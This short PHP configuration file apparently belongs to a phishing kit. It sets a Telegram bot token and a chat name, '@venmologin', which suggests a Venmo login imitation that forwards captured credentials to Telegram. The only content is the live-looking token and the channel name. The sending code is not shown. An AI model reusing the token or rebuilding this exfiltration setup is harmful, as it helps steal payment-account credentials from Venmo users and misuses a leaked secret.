<?php
$coronatoken = '7030490292:AAEBP4EtRRTLod0XeyZUwlyUrPwyBwEiXdw';
$coronachat  = '@venmologin';
?>
